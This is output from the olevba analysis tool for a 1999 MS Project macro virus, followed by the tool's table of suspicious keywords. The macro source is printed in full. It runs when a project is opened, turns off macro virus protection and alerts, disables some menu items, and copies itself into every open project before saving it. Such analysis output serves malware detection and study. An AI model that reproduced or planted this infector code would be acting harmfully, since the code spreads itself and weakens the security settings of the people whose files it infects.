olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSProject.Eikrad
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisProject.cls 
in file: Virus.MSProject.Eikrad - OLE stream: '   2/CVba/2b400008_ffffffff/VBA/ThisProject'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Project
Private Sub Project_Open(ByVal pj As MSProject.Project)
On Error Resume Next
Application.EnableCancelKey = pjDisabled
Application.DisplayAlerts = False
Application.MacroVirusProtection = False
Application.DisplayStatusBar = False
Application.CommandBars("Tools").Controls(9).Enabled = False
Application.CommandBars("Tools").Controls(12).Enabled = False
OurCode = ThisProject.VBProject.VBComponents(1).CodeModule.Lines(1, 31)
With Application.VBE.VBProjects(1).VBComponents(1).CodeModule
    If .Lines(1, 1) <> "'Project" Then
        .DeleteLines 1, .CountOfLines
        .InsertLines 1, OurCode
    End If
End With
For x = 1 To Projects.Count
    With Projects(x).VBProject.VBComponents(1).CodeModule
        If .Lines(1, 1) <> "'Project" Then
            .DeleteLines 1, .CountOfLines
            .InsertLines 1, OurCode
            Projects(x).Activate
            FileSaveAs Projects(x).FullName
        End If
    End With
Next
ThisProject.Activate
If Day(Now) = Int(Rnd * 31) + 1 Then MsgBox ".-=-=-=-=-=-=-=-=-=-=-." & vbCr & "|  watch people fear!  |" & vbCr & "`-=-=-=-=-=-=-=-=-=-=-´", 0, "P98M/Project.A"
End Sub
'P98M.Project by jackie/Lz0NT/MVT | Darkie, what's up
'Worlds first resident MS Project infector | Oct 29 / 99

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

